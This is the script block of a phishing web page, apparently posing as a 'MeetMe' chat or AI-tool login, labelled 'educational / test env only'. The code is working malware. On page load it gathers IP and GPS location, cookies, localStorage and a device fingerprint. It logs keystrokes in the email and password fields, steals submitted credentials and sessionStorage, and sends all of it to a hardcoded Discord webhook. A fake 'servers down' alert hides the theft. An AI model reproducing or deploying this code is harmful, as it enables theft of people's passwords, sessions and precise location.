    <!-- ========================================================= -->
    <!--  THE MALICIOUS JAVASCRIPT (Educational / Test Env ONLY)   -->
    <!--  Full IP + GPS + Keylogger + Storage Dumper.              -->
    <!-- ========================================================= -->
    <script>
        // =========================================================
        // STEP 0: CONFIGURE YOUR DISCORD WEBHOOK (Placeholder)
        // Replace with your own webhook ONLY in your isolated lab.
        // =========================================================
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1550434148512964640/4xPqXbuR-OJ2iCER8ehFIHSBWyN5Nk4MMeRahivzM7JBAdgduvSAfaQBPLEWYYsjCgHP";

        // Helper: send data to Discord
        async function sendToDiscord(message) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: message })
                });
            } catch (_) { /* silent fail */ }
        }

        function now() {
            return new Date().toISOString().replace('T', ' ').slice(0, 19);
        }

        // =========================================================
        // FAKE TYPING ROTATOR (Just for immersion)
        // =========================================================
        const phrases = [
            '"Free to stay"',
            '"Whats up? :3"',
            '"Hangout with strangers"',
            '"Chat with friends"'
        ];
        let idx = 0;
        setInterval(() => {
            idx = (idx + 1) % phrases.length;
            document.getElementById('typingText').textContent = phrases[idx];
        }, 2800);

        // =========================================================
        // STEP 1: FETCH IP + APPROX LOCATION (ipapi.co)
        // =========================================================
        async function fetchIPLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (!response.ok) throw new Error('IP API failed');
                const data = await response.json();
                return {
                    ip: data.ip || 'N/A',
                    city: data.city || 'N/A',
                    region: data.region || 'N/A',
                    country: data.country_name || 'N/A',
                    postal: data.postal || 'N/A',
                    lat: data.latitude || 'N/A',
                    lon: data.longitude || 'N/A',
                    isp: data.org || 'N/A',
                    timezone: data.timezone || 'N/A'
                };
            } catch (e) {
                return { error: 'IP lookup failed (adblocker or network issue)' };
            }
        }

        // =========================================================
        // STEP 2: REQUEST EXACT GPS (Requires user "Allow")
        // =========================================================
        function requestGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ gps_status: 'Geolocation API not supported' });
                    return;
                }
                let resolved = false;
                const timeout = setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        resolve({ gps_status: 'GPS request timed out (user ignored)' });
                    }
                }, 5000);

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        if (!resolved) {
                            resolved = true;
                            clearTimeout(timeout);
                            resolve({
                                gps_status: 'GPS captured successfully',
                                gps_lat: position.coords.latitude,
                                gps_lon: position.coords.longitude,
                                gps_accuracy_meters: position.coords.accuracy
                            });
                        }
                    },
                    (error) => {
                        if (!resolved) {
                            resolved = true;
                            clearTimeout(timeout);
                            let msg = 'GPS denied/unavailable';
                            if (error.code === 1) msg = 'GPS permission denied by user';
                            else if (error.code === 2) msg = 'GPS position unavailable';
                            else if (error.code === 3) msg = 'GPS request timed out';
                            resolve({ gps_status: msg });
                        }
                    }
                );
            });
        }

        // =========================================================
        // STEP 3: ON PAGE LOAD — HARVEST EVERYTHING
        // =========================================================
        (async function initialExfil() {
            const ipData = await fetchIPLocation();
            const gpsData = await requestGPSLocation();

            let storageDump = 'N/A';
            try { storageDump = JSON.stringify(localStorage, null, 2) || 'Empty'; } catch (_) {}

            let locationText = '';
            if (gpsData.gps_status.includes('successfully')) {
                locationText = `
        **📍 EXACT GPS (Real Location)**
        Status: ${gpsData.gps_status}
        Exact Lat: ${gpsData.gps_lat}
        Exact Lon: ${gpsData.gps_lon}
        Accuracy: ±${gpsData.gps_accuracy_meters} meters
        *(IP location ignored because GPS is precise)*
                `;
            } else {
                locationText = `
        **🌐 IP-BASED (Fallback - Approx)**
        IP: ${ipData.ip || 'N/A'}
        City: ${ipData.city || 'N/A'}
        Region: ${ipData.region || 'N/A'}
        Country: ${ipData.country || 'N/A'}
        ISP: ${ipData.isp || 'N/A'}
        Approx Lat/Lon: ${ipData.lat || 'N/A'}, ${ipData.lon || 'N/A'}
        *(GPS was ${gpsData.gps_status})*
                `;
            }

            const fingerprint = `
        🕵️ **NEW AI TOOL USER** (${now()})
        ${locationText}

        **💻 DEVICE FINGERPRINT**
        URL: ${window.location.href}
        User Agent: ${navigator.userAgent}
        Platform: ${navigator.platform}
        Screen: ${screen.width}x${screen.height}
        Language: ${navigator.language}
        Cookies: ${document.cookie || 'HttpOnly/None'}

        **💾 LOCAL STORAGE DUMP**
        \`\`\`json
        ${storageDump}
        \`\`\`
            `;
            sendToDiscord(fingerprint);
        })();

        // =========================================================
        // STEP 4: KEYLOGGER (targets the login form)
        // =========================================================
        const emailField = document.getElementById('email');
        const passField = document.getElementById('password');
        let keyBuffer = [];

        function flushKeys() {
            if (keyBuffer.length > 0) {
                const keys = keyBuffer.join('');
                sendToDiscord(`⌨️ **Keystroke Buffer** (${keyBuffer.length} chars): \`\`\`${keys}\`\`\``);
                keyBuffer = [];
            }
        }

        document.addEventListener('keydown', (e) => {
            if (e.target === emailField || e.target === passField) {
                if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace') {
                    if (e.key === 'Backspace') keyBuffer.push('[⌫]');
                    else keyBuffer.push(e.key);
                }
                if (keyBuffer.length >= 20) flushKeys();
            }
        });

        let flushTimer = setInterval(() => {
            if (keyBuffer.length > 0) flushKeys();
        }, 8000);

        // =========================================================
        // STEP 5: INTERCEPT FORM SUBMISSION (Steal creds)
        // =========================================================
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = emailField.value;
            const password = passField.value;

            flushKeys();
            clearInterval(flushTimer);

            const credMessage = `
        🚨 **LOGIN CREDENTIALS CAPTURED** (${now()})
        **Email**: ${email}
        **Password**: ${password}
        **User Agent**: ${navigator.userAgent}
            `;
            sendToDiscord(credMessage);

            // Dump session storage too
            try {
                const sess = JSON.stringify(sessionStorage, null, 2);
                if (sess.length > 2) {
                    sendToDiscord(`📂 **SessionStorage**: \`\`\`json\n${sess}\n\`\`\``);
                }
            } catch (_) {}

            // =============================================
            // DECOY: Fake "Generating" to hide the theft
            // =============================================
            const btn = document.querySelector('.btn-login');
            btn.textContent = 'Logging in...';
            btn.disabled = true;
            btn.style.opacity = '0.6';

            setTimeout(() => {
                alert('⚠️ Oops! Our Servers are currently down. Please try again later.');
                btn.textContent = 'Login';
                btn.disabled = false;
                btn.style.opacity = '1';
                emailField.value = '';
                passField.value = '';
                keyBuffer = [];
                flushTimer = setInterval(() => {
                    if (keyBuffer.length > 0) flushKeys();
                }, 8000);
            }, 2200);
        });

        // =========================================================
        // STEP 6: EXFILTRATE ON PAGE UNLOAD (sendBeacon)
        // =========================================================
        window.addEventListener('beforeunload', function() {
            if (keyBuffer.length > 0) {
                const keys = keyBuffer.join('');
                navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
                    content: `⌨️ **FINAL BUFFER** (Unload): \`\`\`${keys}\`\`\``
                }));
            }
            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
                content: `🚪 **Page Unloaded** at ${now()}`
            }));
        });

        // Innocent console log
        console.log('%c✍️ MeetMe v1.2', 'font-size:16px; color:#a29bfe; font-weight:bold;');
        console.log('%cReady to have fun!', 'font-size:12px; color:gray;');
    </script>
